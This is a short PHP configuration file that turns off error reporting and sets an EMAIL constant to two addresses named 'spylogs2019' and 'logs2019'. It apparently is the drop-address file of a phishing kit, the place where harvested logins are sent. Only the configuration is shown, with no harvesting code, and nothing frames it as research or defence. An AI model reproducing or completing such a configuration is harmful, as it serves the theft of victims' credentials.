<?php
error_reporting(0);
$ur_email   = "spylogs2019@gmail.com,logs2019@admin-mails.host   ";
define("EMAIL", "$ur_email");
?>